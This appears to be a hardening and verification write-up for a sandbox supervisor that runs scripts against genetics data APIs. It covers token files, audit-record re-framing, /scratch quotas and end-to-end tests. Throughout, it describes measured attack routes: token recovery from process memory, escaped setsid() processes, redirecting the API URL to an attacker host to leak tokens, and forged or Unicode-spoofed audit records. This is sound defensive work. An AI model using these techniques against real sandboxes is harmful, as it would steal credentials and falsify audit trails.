-The two tokens arrive in the POST body, are checked for consistency at parse time, and are
-written before the fork to `/scratch/<execution_id>/tokens.json`, mode `0600`, `O_EXCL`. The
-child is given the **path** in `SANDBOX_TOKEN_FILE`, never the tokens themselves — a token in
-the environment is readable through `/proc/<pid>/environ` by any process with the same uid,
-and supervisor and child share uid 65532. The supervisor never puts them in its own
-environment, never writes them to the pod spec, a ConfigMap or a Secret, and never reads the
-file back. `4h6.44` owns the other half in the SDK, and **it has landed** — see "The SDK half
-(`4h6.44`)" below for what it does and what it does not buy.
-
-**No `chown` and not mode `0400`.** That is section 2's "Permission contract" for option (a),
-which is **NOT IN EFFECT**: the pod holds no `CAP_CHOWN` or `CAP_SETUID` and both were
-measured to return `EPERM`. `0400` without the `chown` would exclude the child, which is the
-process that has to read it.
-
-**What this file does and does not bound, restated after `4h6.55` option (b) landed.** Three
-routes were measured against the ORIGINAL shape, in which the process holding tokens was also
-the process that forked:
-
-- the child was forked **without exec** from a supervisor holding tokens in its address space,
-  and a raw `/proc/self/mem` scan in the child recovered them — **including from an execution
-  that had already completed and been released**. Clearing references could not help: freed
-  Python strings stay in arenas that copy-on-write hands to the child;
-- the same tokens were reachable by module global, frame walk and `gc.get_objects()`;
-- a detached `setsid()` grandchild of an **earlier** execution read **this** execution's
-  mode-0600 file from inside the read-once window.
-
-**The first two are closed, and by the fork server rather than by anything in this file** (see
-"As built (`4h6.55`)" above): the child is now forked from a process that has never held a
-token, a request body or a line of anyone's source code. **The third is bounded, and only for the
-resident that was forked by an EARLIER execution**, which is the shape that was measured: the
-fork server is a child subreaper and sweeps what reparents to it at the end of each execution
-(`genetics-results-suite-4h6.83`), so a grandchild of execution A **whose chain is no more than
-`FS_SWEEP_MAX_ROUNDS` (4) deep** is dead before execution B's token file is written. A deeper
-chain is not: reparenting happens only when a process's own parent exits, so each execution's
-sweep peels four levels off and the remainder is still there — logged, but alive — while the
-next execution writes its file. It is **not** closed against a resident of the SAME execution, and it is
-unverified under gVisor. So mode 0600 still bounds nothing against a same-uid process, and
-read-once-and-unlink still narrows only the window rather than the reachable set — what has
-changed is which processes are alive to be in that window.
-
-What this file *is* now is the route that makes option (b) possible, which the earlier wording
-missed entirely: the child needs its credential and the fork server must not carry it, so a
-file the **supervisor** writes and the **child** opens is the one route from one to the other
-that does not pass through the process in between. It also keeps the token out of
-`/proc/<pid>/environ` and gives the SDK something to unlink. **The residual exposure is
-`genetics-results-suite-4h6.83`'s, and what bounds it is the subreaper sweep rather than
-anything in this file: a resident of an EARLIER execution is dead before this execution's file
-is written provided its chain is within the sweep's four-round depth, a deeper chain outlives
-that execution by however many levels it has left, and a resident of THIS execution is not
-bounded at all.** The
-supervisor also unlinks the file itself the moment the child is reaped, whether or not the
-SDK ever read it, and `_retain` deletes it again with the rest of the directory; that is
-hygiene, not a bound.
-
-**Refusing to run uncredentialed** is enforced in `parse_execute_request`, before any
-directory exists: a token set that is incomplete, carries the wrong audience, or disagrees
-with the body's `user`/`session_id`/`execution_id` is a `400`. This matters because db-api's
-pre-existing fail-open branch (unset `INTERNAL_API_SECRET` disables auth with a startup
-warning) is exactly what an uncredentialed run would reach.
-
-The `sub`/`sid`/`jti` claims stay on the request object and `4h6.45` stamps audit records from
-them. The supervisor is the only component that both holds the token and sits outside the
-child's address space, which is why `4h6.12` put the stamping here.
-
-**The SDK half (`4h6.44`), as built.** It lives in genetics-mcp-server's
-`tools/executor.py` — `_read_and_unlink`, `_load_sandbox_tokens`, `_parse_sandbox_tokens`,
-`_SandboxTokenAuth` and `_build_client` — not in `sdk/client.py`, because the client the SDK
-delegates to is the executor's. Five properties, each with a reason:
-
-- **Read once, and unlink whether or not the read succeeded.** The unlink is in a `finally`
-  around the read, so a file the SDK failed to parse is still removed rather than left for
-  the next process with this uid. The read is capped at 64 KiB.
-- **`O_NOFOLLOW`**, for the same reason the supervisor writes with it: `/scratch` is writable
-  by the child's uid, so a symlink planted at the path would otherwise redirect the read.
-- **Per-destination audience binding.** One httpx client serves both upstreams and the two
-  tokens are not interchangeable, so the audience is chosen per request from the destination
-  (`aud: db-api` for `BIGQUERY_API_URL`, `aud: results-api` for `GENETICS_API_URL`) rather
-  than by a default header on the client. Both validators pin `aud` as a **string** and
-  refuse a list, so a token sent to the wrong service is a hard `401`, not a degraded success.
-- **Hard failure rather than an uncredentialed run.** `SANDBOX_TOKEN_FILE` being set is the
-  statement that this process is a sandbox execution; a file that is missing, unreadable,
-  not JSON, or short of either audience raises rather than falling back to
-  `INTERNAL_API_SECRET` or to no header. The sandbox path and the service path are mutually
-  exclusive by construction — the secret is never attached alongside the token, because a
-  request carrying it resolves no sandbox principal and is served with no accounting
-  (`genetics-results-suite-0lf`).
-- **A request to any other destination gets no credential.**
-
-**What the binding is worth, stated exactly.** It is hygiene against a misconfigured or
-accidentally-redirected base URL, plus the correctness property that neither upstream can be
-handed the other's token. **It is not a control over the script.** The child is forked
-without exec and therefore owns `os.environ`; `base_url` and `bigquery_url` are resolved from
-`GENETICS_API_URL`/`BIGQUERY_API_URL` on **first use**, and `sdk/__init__.py` holds
-`_client = None` until the first call. Reproduced: with a valid token file present and
-`GENETICS_API_URL` pointed at an attacker-controlled host **before** the first SDK call, the
-request went out carrying the results-api token. What stops that in the pod is the egress
-allow-list in `k8s/network-policies/sandbox-policy.yaml` and nothing in the SDK — and there is
-no NetworkPolicy in the local Docker path, so the local sandbox does not have that stop.
-
-**And it is not an exposure bound either**, for exactly the reasons the file is not: the
-token is in the child's own address space the moment the SDK reads it, `4h6.55`'s
-`/proc/self/mem` scan recovered tokens from an execution that had already completed, and a
-detached `setsid()` grandchild of an earlier execution read a live token file from inside the
-read-once window. Read-once-and-unlink is worth building and is worth nothing as a bound. The
-exposure is bounded by `4h6.55`'s resolution and by nothing here.
-
-**What the token does buy** is that the credential on the wire is 5 minutes long, scoped to
-one audience, and carries `sub`/`sid`/`jti` — so the upstream controls keyed on `jti` are no
-longer inert and every `endpoint_access` line is attributable to a user, a conversation and an
-execution. That is a real change from `INTERNAL_API_SECRET`, which never expires, is accepted
-at both services, and resolves no principal at all.
-
-**The two upstreams do not meter the same way, and the asymmetry is not "one meters and one
-does not".** Re-derive rather than trusting this:
-
-| | results-api (`app/core/sandbox_budget.py`) | db-api (`api/sandbox_budget.py`, `api/main.py`) |
-|---|---|---|
-| per-`jti` request count | **1000** (`SANDBOX_MAX_REQUESTS_PER_EXECUTION`) | **1000** (`SANDBOX_MAX_REQUESTS_PER_EXECUTION`) |
-| per-`jti` concurrency | **4**, and **8** pod-wide | **4**, and **8** pod-wide |
-| per-`jti` aggregate bytes | **1 GiB** response bytes | **200 GB** BigQuery bytes processed |
-| where it is enforced | `SandboxResponseCapMiddleware`, **before routing** — an unmatched path is admitted and counted like any other | the count and the concurrency in `SandboxBudgetMiddleware`, **before routing**; the byte budget still in the handlers, on the four BigQuery paths only |
-
-**As measured for `4h6.49`, db-api had neither of the first two rows, and that is what
-`4h6.61` closed.** The paragraph below is what the measurement said at the time; it is kept
-because the reasoning is what decided the fix, not because it still describes the code.
-
-> So `genetics.sql()` — the most expensive surface the sandbox reaches — is **bounded by spend
-> and attributable per execution, but not bounded by request count or by concurrency**: a script
-> can issue unlimited db-api requests at unlimited concurrency as long as each stays inside the
-> 200 GB aggregate, and db-api's cheap paths (`/health`, the cached `/schema` hits) are not
-> counted at all.
-
-The candidate reading that this asymmetry was *correct* — db-api meters BigQuery spend,
-results-api meters egress and pod memory — was rejected on one measured fact: db-api is
-`replicas: 1` at `cpu: 500m` / `memory: 512Mi` (`k8s/deployments/db-api.yaml`) and is called by
-chat-backend and mcp-server as well as by the sandbox, so the load a script can put on it is
-**not** self-limiting the way a spend budget is. Its zero-BigQuery paths — `/health`, `/docs`,
-`/redoc`, `/openapi.json`, an unmatched path, `/schema` on a categorical-value cache hit,
-`/stats`' `get_table` metadata loop — charge the byte budget nothing and were reachable in a
-loop at unbounded concurrency for the whole 60-120 second wall clock. The failure mode was a
-degraded **browser chat path**, i.e. an outage of something the sandbox does not own, which is
-availability rather than spend and is exactly the thing a byte budget cannot bound.
-
-#### `4h6.45` — the audit stream: read, capped, re-framed, stamped, forwarded
-
-A second pipe, created before the fork, dup'd onto `CHILD_AUDIT_FD` (4) in the child and named
-to the SDK as `GENETICS_SDK_AUDIT_FD`. The supervisor holds the read end and drains it on a
-third thread that shares the `reaped` event and `DRAIN_GRACE_S` deadline the output and status
-pipes use — the audit write end is inherited by an escaped descendant exactly as the output
-pipe's is, so EOF is not something waiting longer can produce.
-
-**Because the supervisor's stdout is now the audit channel, everything else the supervisor
-writes to it is on that channel too** — and the HTTP access line carries the caller's raw
-request line. `4h6.64`: the handler's `log_message` override had dropped the stdlib's
-`_control_char_table` translation, which exists precisely so a request line cannot put ANSI
-escapes or bare CRs onto the server's log. It is restored, so an operator reading `kubectl logs`
-cannot be shown a line that lies about how many records there are. What it never could do,
-checked and re-checked: **forge an SDK audit record.** `SDK_CALL_RE` is anchored and
-`log_message` appends `" <code> <size>"` after the request line, so no crafted request produces a
-line the analyzer reads as a genuine call — attribution was never at risk. The table is taken
-from `BaseHTTPRequestHandler` when the interpreter has it and rebuilt identically when it does
-not, rather than letting the log path raise on an `AttributeError` — with the reason for the
-fallback stated honestly. `_control_char_table` is private, so nothing promises it stays, but it
-is MEASURED present since **3.10**: this checkout's 3.12 and the image's distroless 3.11 both
-take the stdlib's, so **the fallback is dead code in the shipped image**. It is kept as
-defensiveness against an interpreter that drops it, not because any interpreter in play lacks
-it, and the rebuilt table was verified dict-equal to the stdlib's.
-
-`_AuditForwarder`, one instance per execution, does four things and each was demonstrated:
-
-- **Caps, on the read end.** `AUDIT_LINE_MAX_BYTES` (4 KiB, per record), `AUDIT_STREAM_MAX_BYTES`
-  (1 MiB, per execution, counted over everything read including what is then dropped) and a
-  token bucket (`AUDIT_RATE_PER_S` 100, `AUDIT_RATE_BURST` 200). An over-long record is
-  **dropped, never truncated**: a truncation removes the tail where `rows:` lives, so it either
-  produces something that no longer parses or a prefix that parses as a *different* record —
-  the same replace-don't-truncate rule `_sanitise_error_type` applies to a child-supplied
-  `error.type`. **The same rule holds at the byte budget**, which is the one place a cut is not
-  the reader's choice: the child picks where the boundary falls by padding, so the partial
-  record left in the buffer when the budget bites is **discarded, never flushed at close** — a
-  validator padded to the budget with oversize lines (which spend no rate token) and turned
-  `rows: 999999999` into a forwarded `rows: 9` under the real user's stamp, counted as
-  `records=1`. Past the byte budget the reader **keeps reading and discards**, the status
-  pipe's behaviour and deliberately not the output pipe's: stopping would block the child's
-  next audit write, and a child blocked inside a successful data call turns an observability
-  bound into an execution failure. What is discarded is counted by its newlines **plus the
-  unterminated record at the end**, so a flood carrying no newline at all still reports a
-  `dropped_over_budget` rather than only a larger `bytes=`.
-- **Re-parses and re-frames.** Every line is matched **whole** against three shapes — the SDK's
-  `Executing SDK function:` record, its `Rejected SDK function:` record, and its refusal-budget
-  notice as a fixed literal — and anything that does not match is dropped and counted. Laxity
-  here is the forgery: `search()`-based parsers, including this repo's own
-  `scripts/analyze_conversations.py`, match a record *anywhere* in a line, so a child appending
-  `[user=admin@finngen.fi] … Executing SDK function: sql … rows: 1` to an otherwise ordinary
-  record would otherwise have written a genuine-looking access under someone else's name. The
-  argument summary is admitted as **printable ASCII minus `[`, `]`, `{`, `}` and backslash**, or
-  as the bare literal `<unavailable>` — the two things `_summarize_arguments` can return, the
-  second being what it returns when `signature.bind_partial` raises `TypeError`, i.e. whenever an
-  ordinary script passes one extra positional or one unknown keyword. That charset is **tighter
-  than the SDK's own**, deliberately: `_summarize_value` falls through to
-  `f"<{type(value).__name__}>"` and a script owns `__name__`, so the emitting side is not where
-  this can be held. Non-ASCII was measured reaching the container's stdout inside an otherwise
-  genuine record — U+2028, U+2029 and U+0085 each split the record into **two** lines under
-  `str.splitlines()`, and U+202E reverses how the rest of it reads. Row counts are matched with
-  `[0-9]`, never `\d`, which in Python is every Unicode decimal digit: `rows: ١٢٣` was forwarded
-  and the analyzer's `int()` read back 123. The SDK's shared-stream warning is deliberately
-  **not** admitted: on this path it is false, and forwarding it would make the analyzer distrust
-  a stream the supervisor stamped. Its refusal-budget notice **is** admitted, and the number in
-  it is **child-supplied** — nothing on the read end counts the SDK's refusals, so a child can
-  write the notice itself with a figure of its choosing (`999999999` was measured); the literal
-  text around it is what is bounded, and the supervisor's own summary is the cross-check.
-- **Keeps reading even when forwarding fails.** If the sink raises, the drain thread discards
-  the rest of that stream and keeps reading the fd. It may not stop: nothing else reads it, the
-  64 KiB pipe fills, and a still-running child blocks in `os.write` inside a call that was
-  succeeding — the same reason the byte budget discards rather than stops.
-- **Stamps identity from the tokens.** `[user=…] [session=…] [execution=…]` come from the
-  claims' `sub`/`sid`/`jti`, sanitised on the same charset-and-replace rule (a value that would
-  break the framing renders `<invalid>`). Everything before the record marker — the SDK's
-  asctime, logger name, level and its own prefix — is discarded rather than parsed.
-- **Forwards to the pod's own stdout**, written to the stream directly rather than through
-  `LOG`: the logging configuration belongs to `main()`, and stdout is block-buffered when it is
-  a pipe (which is what it is under both `docker logs` and the kubelet), so each record is
-  flushed. In the local Docker backend this is the container's stdout — the same code, a
-  different collector.
-
-MEASURED IN THE IMAGE, from a child writing directly on fd 4: a forged
-`[user=admin@finngen.fi]` prefix and a rewritten `SANDBOX_USER` produced a record stamped
-`[user=dave@finngen.fi]`, and the string `admin@finngen.fi` appeared nowhere in the container's
-stdout; a record with a second record appended was dropped whole (`dropped_unparseable=1`, and
-`rows: 99` never appeared); a 1 MiB line produced `dropped_oversize=1` with none of its bytes
-on the stream; 2,000 records in one `write()` produced `records=202 dropped_rate=1798`; and
-1.3 MB produced `dropped_over_budget=3869` with the execution still returning `status: "ok"`.
-
-**What this does not make true.** The records still do not bound what a hostile script *did*:
-it can emit well-formed records for calls it never made, `client._executor.<method>()` reads
-data with no record at all (`4h6.33`), and a child can still lose its own records by flooding
-its own pipe. What is bounded is **who a record is attributed to** and **what shape it may
-take**, and that the loss is counted rather than silent.
-
-#### `4h6.46` — `/scratch` sub-quotas, retention and the reaper
-
-| budget | value | enforcement |
-|---|---|---|
-| per-execution artifacts | 64 MiB **and** 1024 entries | polled; over → `status: "limit"`, `error.type: "ArtifactQuota"` |
-| per-execution total (`/scratch/<id>`, artifacts + tmp + caches) | 192 MiB **and** 20 000 entries | polled; over → `status: "limit"`, `error.type: "ScratchQuota"` |
-| aggregate `/scratch` during a run (retained + live) | 480 MiB | polled; over → `status: "limit"`, `error.type: "ScratchQuota"` |
-| aggregate retained artifacts | 256 MiB | oldest-first eviction when a completion breaches it |
-| retention | 5 min from completion, deleted on the next reaper tick — so the observable window is **[5 min, 5 min + 30 s]** | reaper thread, every 30 s (`REAPER_POLL_S`) |
-| manifest entries in one response | 1024 | listed; the rest counted in `artifacts_omitted` |
-
-**The budget, stated once.** `sandbox/supervisor.py` states the same arithmetic in one comment
-block above the constants and nowhere else; an earlier version stated it in two places that
-contradicted each other (`448 MiB < 512 MiB` in one, a `~200 MiB` poll overshoot in the
-other — `256 + 192 + 200 = 648` against a 512 MiB volume).
-
-```
-  RETAINED_ARTIFACTS_CEILING   256 MiB   steady state, held by oldest-first eviction; each
-                                         term is bounded — a COMPLETED retention is trimmed to
-                                         the 64 MiB artifact quota before it is retained, a
-                                         FAILURE-PATH one is neither cleaned nor trimmed and is
-                                         bounded by the 192 MiB execution quota instead
-+ EXECUTION_TOTAL_QUOTA        192 MiB   the one live execution
-= 448 MiB
-<= SCRATCH_AGGREGATE_CEILING   480 MiB   = 512 MiB sizeLimit − 32 MiB for .supervisor and for
-                                         filesystem overhead the per-tree walks do not see
-```
-
-`448 <= 480` is what makes the aggregate check a **backstop rather than a second quota**: the
-two per-part budgets cannot together reach it, so it fires only on overshoot. **The kubelet
-must never be the thing that fires:** exceeding an `emptyDir` `sizeLimit` does not fail the
-write, it **evicts the pod**, killing the in-flight script and destroying every retained
-artifact in the window.
-
-**What this arithmetic does not prove.** The 32 MiB reserve is a margin, not a proof. A poll
-can miss ~200 MiB of writes, and a child that traps `SIGTERM` keeps writing for
-`KILL_GRACE_S` (2 s) after a quota fires; neither is bounded by 32 MiB and no arrangement of
-these constants would bound them. What bounds them is how fast the writer is stopped (`SIGTERM`
-immediately, `SIGKILL` 2 s later) and, afterwards, the trim. So the honest claim is: **the
-steady state is exact and sits 64 MiB under the cliff; the transient peak during a hostile
-burst is not**, and the aggregate check is what fires 32 MiB early instead of letting the
-kubelet be the thing that notices.
-
-- **Accounting is on `st_blocks` plus a per-entry floor, not `st_size`,** and both halves are
-  needed. `st_blocks` because `f.seek(512 << 20); f.write(b'x')` makes a file whose apparent
-  size is 512 MiB and whose blocks are nearly none — charging apparent size would kill that
-  script for using no space. The 512-byte per-entry floor because charging blocks *alone* said
-  a zero-length file was free: **measured**, 300 000 empty files charged 8.6 MB against the
-  192 MiB quota, so no limit fired, while the response reached 19.8 MB and the supervisor's RSS
-  went 22 MB → 166 MB. An empty file costs an inode, a directory entry, a manifest row and a
-  scan step; it is not free anywhere that matters.
-- **The entry budgets bound the watchdog's own scan, which is why the wall clock is a bound at
-  all.** The scan stops at the budget — a tree with more entries than the budget allows is over
-  it, and the exact count past that point changes no decision. Before that, one pass over
-  800 000 empty files took 8.47 s and reported 0 bytes, and `artifacts/` was walked twice
-  because it lives under the base directory: **measured**, with `timeout_s=30`, 0 files → killed
-  at 30.23 s, 200 000 → 45.51 s, 800 000 → 46.74 s. `MAX_QUEUED_WAIT_S` is 120 s, so every
-  second past the deadline is a second the next two callers spend queued or being `429`ed.
-- **The poll interval is 200 ms and is chosen against the WALL CLOCK, not the overshoot.** The
-  wall clock is the tightest of the four in the only sense that matters — it is the one bound a
-  client is told the exact value of. The overshoot is the *loosest*: at ~1 GiB/s a poll misses
-  ~200 MiB and no interval anybody would run makes that small. Three things keep the deadline
-  honest: the poll wait shrinks as the deadline approaches, the scan is entry-bounded, and the
-  clock is re-checked immediately *after* the scan so an overrun fires on that tick. The
-  harness's quota tests still pace their writes — an unpaced writer hits `ENOSPC` (locally) or
-  an eviction (in the pod) before the poll it is trying to demonstrate ever runs.
-- **`artifacts/` is TRIMMED to its quota before it is retained,** newest entries first by
-  mtime. Without this a quota kill retained its own overshoot: **measured**, a burst write
-  killed by `ArtifactQuota` at 64 MiB left 93 MiB on disk (46 % over) in 0.31 s, and at the
-  ~1 GiB/s tmpfs sustains that is ~264 MiB. Retaining it made the 256 MiB ceiling a ceiling
-  over unbounded terms. The trim runs *before* the manifest is built — the other order would
-  advertise names the trim then deletes — and what it deleted is reported in
-  `artifacts_omitted`, the field that already means "present but not listed". Newest-first
-  because the entry that blew the quota is the one being written when the kill landed.
-- **Cleanup and post-hoc accounting are not bounded by the budgets they restore**, and bounding
-  them there was circular. A *live* scan stops at the 20 000-entry budget because past that
-  point the tree is over it either way. The trim stopping there meant it sorted a truncated
-  sample and derived both the surviving entry count and the size it caches from it: **measured**,
-  25 000 zero-length files left **6 024 entries against the 1 024 budget** and reported
-  **0.5 MiB where the tree really held 2.9 MiB** — a 6× undercount that scales linearly, and
-  the number the aggregate check and the ceiling eviction then treat as fact. It is reachable
-  inside `KILL_GRACE_S` alone: ~14 000 empty-file creations/s were measured on a slow local
-  filesystem, and the pod's `emptyDir` is faster. The trim now drains in bounded passes —
-  chunk-at-a-time, a four-million-entry hard stop, and a pass that deletes nothing gives up
-  rather than looping — so the size it returns is the size that is really there. The same
-  correction applies to the **failure-path retention**, which measured only `artifacts/` on the
-  one path where nothing has cleaned `tmp/`, `home/` or the caches yet, charging up to a whole
-  192 MiB execution as zero; it measures the whole execution directory and re-checks the
-  ceiling on the spot, since nothing else re-checks it until a next completion that may never
-  come.
-- **Retained sizes are measured once and cached.** Re-walking every retained tree on every
-  completion made one 300 000-file execution a tax on all five minutes of executions after
-  it. Nothing the supervisor can reach writes to a retained directory — the child is reaped and
-  the trim has already run — so the value cannot drift *for any process the kill path reaches*.
-  It **can** drift for a `setsid()` escapee, which is not in the killed process group, keeps its
-  write access to `/scratch/<id>/artifacts`, and can grow a tree after its size was cached: the
-  retained total, the ceiling eviction and the in-run aggregate check then all read low. That is
-  the same escapee section 2 records everywhere else; re-measuring would not fix it, since the
-  writes continue after any measurement. The window is now bounded rather than unbounded — the
-  end-of-execution sweep (`4h6.83`) kills such a process when the execution that forked it
-  completes — so the drift is whatever it managed to write before that, not for the pod's
-  lifetime. An earlier wording of this bullet stated the no-drift claim unconditionally.
-- **The cached sizes can also double-count, in the safe direction.** Sizing follows the path it
-  is handed, so a child that replaces its own `artifacts/` with a symlink to another execution's
-  directory gets those bytes charged to both rows: the total reads **high**, so the ceiling
-  evicts earlier than it needs to, and nothing is under-protected. Deletion is unaffected —
-  `shutil.rmtree` does not traverse a symlink and the trim unlinks one rather than descending
-  it. Recorded, not fixed: a child that can plant it is already past the boundary `4h6.55` owns.
-  The guard, if that boundary ever makes it worth having, is one `lstat` before measuring.
-- **Oldest-first eviction has no "never evict the last one" guard**, and removing it was the
-  fix: with it, a single over-ceiling execution sat above the ceiling permanently, because
-  there was nothing older to evict. The trim is what protects the newest execution now, and
-  protects it properly — every retained entry is ≤ 64 MiB against a 256 MiB ceiling.
-- **On completion everything under `/scratch/<id>` is deleted except `artifacts/`**, which is
-  retained 5 minutes so `read_artifact` has something to return and is then deleted
-  unconditionally, read or not.
-- **Eviction is observable on the wire without any host view of `/scratch`:** an evicted
-  execution's id stops answering `409 DuplicateExecutionId` and becomes usable again, because
-  its directory is gone. That is what the harness asserts, in both modes.
-- **The reaper has two mechanisms because they answer different failures.** The registry
-  covers executions that *completed*. A filesystem sweep covers a directory whose job died on
-  a path that never reached `_retain` — an orphan the registry has no row for, which would
-  otherwise sit until the pod restarts; live and queued ids are excluded by name first.
-- **Retention does not survive a pod restart**, and the startup wipe (`4h6.39`) removes
-  everything unrecognised, which after a restart is everything.
-
-**`SANDBOX_RETENTION_S` is a test-only override with the same standing as
-`SANDBOX_SCRATCH_ROOT`:** loud warning on every start, never set by the image and never by
-`k8s/deployments/sandbox.yaml`. It may only **shorten** retention — a larger value is
-**refused at startup, not clamped**, because artifacts outliving what `read_artifact` was told
-is worse than a startup error, and a knob that is silently ignored is a knob that gets
-believed. It exists so the reaper can be watched deleting a directory inside a test run rather
-than five minutes later; `scripts/test-supervisor.py --container URL --retention-s N`
-asserts the caller started the container that way, and **skips the retention check by name**
-when it is absent rather than quietly proving less. Measured this way in the real image: the
-supervisor logged `retention reaper removed 1 execution directory` and the id became reusable.
-
-#### `error.type` is validated on arrival, not echoed
-
-The child is forked without `exec`, so the script holds the status fd and writes the string
-that becomes `error.type`. `message` had a 2 KiB cap and `traceback` an 8 KiB tail cap from the
-start; `type` had **neither a cap nor a validator**, only the 64 KiB status-pipe read.
-**Measured against the container:** a 60 000-character `error.type` reached the response,
-bypassing the 64 KiB output window entirely and landing in a model's context, and a child
-writing `{"type": "Timeout"}` produced `error.type: "Timeout"` with `error.limit: null` — a
-shape only the supervisor is supposed to be able to emit, and one the contract invites clients
-to branch on.
-
-This is **the same defect `4h6.47` fixed on the other side of this wire**, where chat-backend's
-client applied `_redact` to `message` and not to `error_type`. Both ends had the same blind
-spot about the same field.
-
-The supervisor now requires a child-supplied `type` to be ≤ 64 bytes and to match an
-identifier or dotted qualname, and refuses its own reserved names; anything else is reported
-as `NonZeroExit`. `StartupFailure` is the one reserved name a child legitimately writes — from
-the child's own setup handler, which exits `70` and cannot reach the script — so it is admitted
-on that exit code and refused on every other. None of this narrows what the *contract* says
-`type` may hold: the reserved names are still reserved, a real exception class name still
-passes through unchanged, and the field is still an open string to a client.
-
-**The response as a whole is now bounded** at 1 MiB, the mirror of `MAX_BODY_BYTES` on the
-request. Every component is separately capped (64 KiB output, 1024 manifest entries, 64 B
-`type`, 2 KiB `message`, 8 KiB `traceback`), so a well-formed response is ~100 KiB and this
-backstop should never fire; it exists because nothing bounded the outgoing body at all, and a
-19.8 MB one was measured. Degradation drops `artifacts` first — counting them in
-`artifacts_omitted`, since a name the model cannot see is recoverable and output it never sees
-is not.
-
-#### Still not provable locally
-
-`oom_score_adj` writability and `/proc` process-group inspection under **gVisor** are
-unverified — `runsc` implements both in the sentry — and so is the kubelet's `pod_pids_limit`
-as an outer backstop (`--pids-limit` is per container, not per pod). `emptyDir` `sizeLimit`
-eviction has **no local form at all**: the local `/scratch` is a 512 MiB tmpfs that returns
-`ENOSPC`, which is a *different failure* from a pod eviction and a gentler one. These go to
-`4h6.51`, the deploy-window bead.
-
-### As built (`4h6.49`) — the end-to-end local verification: what was measured, and how
-
-`scripts/test-e2e-local.py` drives the whole path against the running local stack —
-chat-backend's **own** minting and client code (`genetics_mcp_server.sandbox_token`,
-`sandbox_client`), the sandbox container `scripts/run-sandbox-local.sh` starts, and the real
-db-api (`:8080`) and results-api (`:2000`) that `scripts/dev-stack.sh` starts. It is a separate
-file from `scripts/test-supervisor.py` on purpose: that harness needs no cluster, no
-credentials, no backends and (in its fast path) no Docker, and folding these preconditions into
-it would take that property away from everyone who re-runs it.
-
-**Measured 2026-08-17 against `genetics_dev`, with a sandbox container started as
-`SANDBOX_RETENTION_S=45 scripts/run-sandbox-local.sh`:**
-
-```
-scripts/test-e2e-local.py --retention-s 45   → OK: 49 checks passed, nothing skipped.
-scripts/test-e2e-local.py                    → OK: 48 checks passed, nothing skipped.
-```
-
-**Each count is quoted next to the command that produces it, because a count without its
-command is not a claim.** The two differ by one check and not by four: the harness *discovers*
-the container's effective retention, so the group runs either way and `--retention-s` only adds
-the cross-check that the caller's number matches. Against a container with **no**
-`SANDBOX_RETENTION_S` — the normal state — the retention group **skips**, the run prints
-`NOT MEASURED (1)` and a `PARTIAL:` banner instead of `OK:`, and it still **exits 0**. A green
-exit is not by itself a claim that everything was measured. The `INTERNAL_API_SECRET` negative
-control skips the same way if that secret is absent or does not authenticate locally. Every
-skip is listed by name under `NOT MEASURED` and counted again in the exit banner for exactly
-this reason.
-
-**The run refuses to start against a container that is not the source under test.** It reads
-`/genetics/supervisor.py` and `/genetics/prewarm.py` back out of the running container with
-`docker cp` and compares them byte for byte with `sandbox/`, exiting 2 if they differ:
-`genetics-sandbox-local` survives rebuilds and branch switches, `run-sandbox-local.sh` is
-itself modified by this change, and every check below would otherwise be a true statement about
-a program nobody is verifying. What that does **not** cover, and is not claimed:
-`sandbox/requirements.txt`, `prune_venv.py` and the genetics-mcp-server checkout the SDK is
-installed from all shape the image without appearing under `/genetics`.
-
-What each check group is worth:
-
-* **The SDK's request is in results-api's `sandbox_budget` map, keyed on the token's `jti`.**
-  A 200 is not the evidence — `app/middleware_usage_logging.py` stamps `jti` and `sid` on the
-  `endpoint_access` record only from a resolved `SandboxPrincipal`, and
-  `SandboxResponseCapMiddleware` calls `admit` for exactly that principal. The **negative
-  control is measured in the same run whenever the secret is available and authenticates** (it
-  was, in the run above): the identical request carrying `INTERNAL_API_SECRET` is served **200
-  with no `jti` at all**, which is the shape of `0lf`. Where it is not available the control
-  **skips by name** rather than being argued. Accumulation, not just
-  admission, is shown by driving `SANDBOX_MAX_CONCURRENT_REQUESTS` (4) from inside a real
-  execution with twelve concurrent SDK calls and reading the `sandbox per-execution limit
-  exceeded` records back out of results-api's log under that same `jti`.
-* **The audit records carry the real identity.** A real execution's SDK calls appear in
-  `docker logs` (the container's **stdout**, not its stderr) in the shipped analyzer's own
-  regex shape, with `user`/`session`/`execution` equal to the token's `sub`/`sid`/`jti` — never
-  `unknown` — and with the function names of the calls actually made. In the same run a script
-  writes a forged `[user=admin@finngen.fi] … Executing SDK function: …` record and a 1 MiB line
-  onto the audit fd: no record parses as `admin@finngen.fi`, everything that survives is
-  re-stamped with the real identity, and the megabyte line is **dropped, not truncated and
-  forwarded** — the supervisor's `a record over 4096 bytes was DROPPED (not truncated)` notice
-  appears under the real `execution` and its per-execution summary counts the record as
-  `dropped_oversize`, which is what a truncate-and-forward regression would fail. The forged
-  script makes a genuine SDK call first, so the two "nothing forged survives" assertions are
-  `all()`/`not any()` over a window that demonstrably contains a real record.
-* **One value, and the join closes.** `execution_id`, `/scratch/<id>`, both tokens' `jti` and
-  the child's `SANDBOX_EXECUTION_ID` are the same string, and that string appears in
-  chat-backend's result, db-api's `sandbox request authorized` record (with the same `sub` and
-  `sid`), results-api's `endpoint_access` record and the audit stream.
-* **Every limit the bead names returns a clean structured result to chat-backend's own
-  client** — not an exception, not a hang: the wall clock (`timeout`/`Timeout`), the 8 MiB pipe
-  cap (`limit`/`OutputLimit`), the per-execution artifact quota (`limit`/`ArtifactQuota`), and
-  the 64 KiB return window (`ok`, head and tail both present, elision visible and counted, with
-  `output_bytes` reporting the true pre-cap total). `test-supervisor.py`'s `limits` group
-  already watches each one fire on the wire; what is new here is that `SandboxClient.execute`
-  turns each into a result dict.
-* **The signing key is fail-closed.** With `SANDBOX_TOKEN_SIGNING_KEY` unset the execution
-  fails by name and a counting transport shows **zero** requests left the client — no fallback
-  to the shared secret and no uncredentialed request. With a *wrong* key the execution runs and
-  both backends answer **401**, and neither records a principal for that `jti`.
-* **Retention, and precisely what the two probes pin.** An artifact is still there **at half
-  the container's own TTL** (the id is still taken, `409 DuplicateExecutionId`) and gone after
-  `TTL + REAPER_POLL_S`, because `SANDBOX_RETENTION_S` shortens the deadline and **not** the
-  reaper's 30s poll. The TTL is not taken from the caller: the harness reads the container's
-  **effective** `SANDBOX_RETENTION_S` from `docker inspect` and from the supervisor's own
-  startup warning, requires the two to agree, and skips by name if they do not — `--retention-s
-  N` only *cross-checks* that value, and a mismatch is a failure rather than two probes about
-  the wrong number. This is why the presence probe waits: a `409` taken the instant the
-  execution returns is satisfied by any positive retention, one second included, so it would
